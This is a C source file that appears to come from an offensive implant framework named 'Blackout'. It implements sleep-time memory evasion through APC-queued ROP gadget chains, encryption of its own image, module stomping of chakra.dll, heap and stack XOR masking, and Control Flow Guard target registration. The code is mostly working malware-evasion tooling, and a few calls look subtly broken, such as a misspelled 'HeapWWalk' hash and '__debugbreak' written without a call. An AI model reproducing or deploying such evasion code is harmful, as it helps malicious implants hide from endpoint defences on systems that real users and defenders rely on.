#include <utils.h>
#include <common.h>
#include <constexpr.h>

FUNC VOID volatile ___chkstk_ms(
        VOID
) { __asm__( "nop" ); }

FUNC VOID XorCipher(
    _In_ PBYTE  pBinary, 
    _In_ UINT64 sSize, 
    _In_ PBYTE  pbKey, 
    _In_ UINT64 sKeySize
) {
    for (SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++) {
        if (j == sKeySize)
            j = 0x00;

        if (i % 2 == 0)
            pBinary[i] = pBinary[i] ^ pbKey[j];
        else
            pBinary[i] = pBinary[i] ^ pbKey[j] ^ j;
    }
}

FUNC VOID HeapObf( 
    PVOID Heap
) {
    BLACKOUT_INSTANCE

    PROCESS_HEAP_ENTRY HeapEntry   = { 0 };
    BYTE               HeapKey[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );

    typedef WINBOOL (*fHeapWalk)(HANDLE hHeap, LPPROCESS_HEAP_ENTRY lpEntry);
    fHeapWalk pHeapWalk = LdrFuncAddr( LdrModuleAddr( H_MODULE_KERNEL32 ), HASH_STR( "HeapWWalk" ) );

    pHeapWalk( Heap, &HeapEntry );
    if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
        XorCipher( HeapEntry.lpData, HeapEntry.cbData, HeapKey, sizeof(HeapKey) );
    }
}

FUNC VOID XorStack(
    PVOID StackBase,
    PVOID StackLimit
) {
    for ( PUCHAR Ptr = StackLimit; Ptr < StackBase; Ptr++ ) {
        *Ptr ^= 0xFF;
    }
}

FUNC VOID SleepMain(
    DWORD SleepTime
) {
    FoliageObf( SleepTime );
}

FUNC PVOID FindNtTestAlertGadget(
    _In_ LPVOID ModuleBase
) {
    BLACKOUT_INSTANCE
    BYTE Pattern[] = { 0xE8, 0xF8, 0xF6, 0x02, 0x00 };

    DWORD ModuleSize = ( (PIMAGE_NT_HEADERS)( ( B_PTR( ModuleBase ) + ( ( PIMAGE_DOS_HEADER )( ModuleBase ) )->e_lfanew ) ) )->OptionalHeader.SizeOfImage;

    for (SIZE_T i = 0; i < ModuleSize; i++) {
        if (Instance()->Win32.RtlCompareMemory( U_PTR64( ModuleBase ) + i, Pattern, sizeof( Pattern ) ) == sizeof( Pattern ) ) {
            return U_PTR64( ModuleBase + i );
        }
    }

    return NULL;
}

FUNC VOID FoliageObf( 
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE
    
    LONG   Status     = 0x00;

    HANDLE EvtSync       = NULL;
    HANDLE hDuplicateObj = NULL;
    HANDLE hSlpThread    = NULL;
    HANDLE hMainThread   = NtCurrentThread();

    CHAR    LibraryFr[]= { 'c', 'h', 'a', 'k', 'r', 'a', '.', 'd', 'l', 'l', 0 }; // todo: dynamic get
    HMODULE hLibraryFr = Instance()->Win32.GetModuleHandleA( LibraryFr );        // todo: get module using LdrModuleAddr | discover hash of the chakra.dll
    PVOID   OldProt    = NULL;

    CONTEXT CtxMain   = { 0 };
    CONTEXT CtxBackup = { 0 };
    CONTEXT CtxSpoof  = { 0 };

    UINT16 ic = 0;

    CONTEXT Ctx[10] = { 0 };

    Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
    if ( Status != 0x00 ) { __debugbreak; return; }    

    Status = Instance()->Win32.NtCreateThreadEx( 
        &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), 
        Instance()->Win32.TpReleaseCleanupGroupMembers, NULL, TRUE, 
        0, 0x1000 * 20, 0x1000 * 20, NULL 
    );
    if ( Status != 0x00 ) { __debugbreak; return; }

    if ( Blackout().Backup ) BK_PRINT( "[OBF] Sleepobf with advanced module stomping\n[OBF] Mapped backup address @ 0x%p\n", Blackout().Backup );

    BK_PRINT( "\n" );
    BK_PRINT( "[BK] Blackout base address    @ 0x%p [0x%x bytes]\n", Blackout().Region.Base, Blackout().Region.Length );
    BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n", Blackout().RxRegion.Base, Blackout().RxRegion.Length );
    BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );

    BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().Gadgets.JmpGadget );
    BK_PRINT( "[OBF] ret gadget to NtTestAlert @ 0x%p\n", Blackout().Gadgets.RetGadget );
    BK_PRINT( "[OBF] NtContinue gadget @ 0x%p\n", Blackout().Gadgets.NtContinueGadget );
    BK_PRINT( "[OBF] SleepObf chain thread at tid: %d\n", hSlpThread );

    CtxMain.ContextFlags = CONTEXT_FULL;
    Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
    if ( Status != 0x00 ) { __debugbreak; return; }

    for ( INT i = 0; i < 9; i++ ) {
        MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
    }

    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
    Ctx[ic].Rbx = &Instance()->Win32.NtWaitForSingleObject;
    Ctx[ic].Rcx = EvtSync;
    Ctx[ic].Rdx = FALSE;
    Ctx[ic].R9  = NULL;
    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
    ic++;

    if ( Blackout().Backup ) {

        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
        Ctx[ic].Rcx = Blackout().Backup;
        Ctx[ic].Rdx = Blackout().Region.Base;
        Ctx[ic].R8  = Blackout().Region.Length;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
        Ctx[ic].Rcx = hLibraryFr;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget; 
        Ctx[ic].Rbx = &Instance()->Win32.LoadLibraryExA; //todo: change to ldrloaddll
        Ctx[ic].Rcx = LibraryFr;
        Ctx[ic].Rdx = NULL;
        Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;
    } else {
        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_READWRITE;
        Ctx[ic].R9  = &OldProt;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;
    }

    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
    Ctx[ic].Rbx = &Instance()->Win32.WaitForSingleObjectEx;
    Ctx[ic].Rcx = NtCurrentProcess();
    Ctx[ic].Rdx = SleepTime;
    Ctx[ic].R8  = FALSE;
    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
    ic++;

    if ( Blackout().Backup ) {
        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        Ctx[ic].R8  = PAGE_READWRITE;
        Ctx[ic].R9  = &OldProt;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Backup;
        Ctx[ic].R8  = Blackout().Region.Length;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_EXECUTE_READ;
        Ctx[ic].R9  = &OldProt;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++; 
    } else {
        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
        Ctx[ic].Rcx = Blackout().Region.Base;
        Ctx[ic].Rdx = Blackout().Region.Length;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;

        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
        Ctx[ic].Rcx = Blackout().RxRegion.Base;
        Ctx[ic].Rdx = Blackout().RxRegion.Length;
        Ctx[ic].R8  = PAGE_EXECUTE_READ;
        Ctx[ic].R9  = &OldProt;
        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
        ic++;
    }

    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
    Ctx[ic].Rbx = &Instance()->Win32.RtlExitUserThread;
    Ctx[ic].Rcx = 0x00;
    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
    ic++;

    for ( INT i = 0; i < ic; i++ ) {
        Instance()->Win32.NtQueueApcThread( hSlpThread, Blackout().Gadgets.NtContinueGadget, &Ctx[i], FALSE, NULL );
    }

    Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
    if ( Status != 0x00 ) { __debugbreak; return; }

    Instance()->Win32.printf( "[OBF] Trigger sleep obf chain\n\n" );

    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
    if ( Status != 0x00 ) { __debugbreak; return; }

_LeaveObf:
    if ( EvtSync ) {
        Instance()->Win32.CloseHandle( EvtSync );
        EvtSync = NULL;
    }

    if ( hSlpThread ) {
        Instance()->Win32.CloseHandle( hSlpThread );
        hSlpThread = NULL;
    }
}    


FUNC BOOL CfgCheckEnabled(
    VOID
) {
    BLACKOUT_INSTANCE

    NTSTATUS Status = STATUS_SUCCESS;
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
    
    Status = Instance()->Win32.NtQueryInformationProcess( 
        NtCurrentProcess(),
        ProcessCookie | ProcessUserModeIOPL,
        &ProcInfoEx,
        sizeof( ProcInfoEx ),
        NULL
    );
    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X\n", Status );
    }

    Instance()->Win32.printf( "[I] Control Flow Guard (CFG) Enabled: %s\n", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return ProcInfoEx.ExtendedProcessInfoBuffer;
}

FUNC VOID CfgAddressAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
) {
    BLACKOUT_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHdrs   = { 0 };
    ULONG                Output   = 0x00;
    NTSTATUS             Status   = STATUS_SUCCESS;

    NtHdrs                  = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = U_PTR( NtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
        NtCurrentProcess(),
        VmCfgCallTargetInformation,
        1,
        &MemRange,
        &VmInfo,
        sizeof( VmInfo )
    );

    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X", Status );
    }
}

FUNC VOID CfgPrivateAddressAdd(
    _In_ HANDLE hProcess,
    _In_ PVOID  Address,
    _In_ DWORD  Size
) {
    BLACKOUT_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output   = { 0 };
    NTSTATUS             Status   = { 0 };

    MemRange.NumberOfBytes  = Size;
    MemRange.VirtualAddress = Address;
    
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = 0;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
        hProcess, 
        VmCfgCallTargetInformation, 
        1, 
        &MemRange, 
        &VmInfo, 
        sizeof( VmInfo ) 
    );

    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X", Status );
    }
}

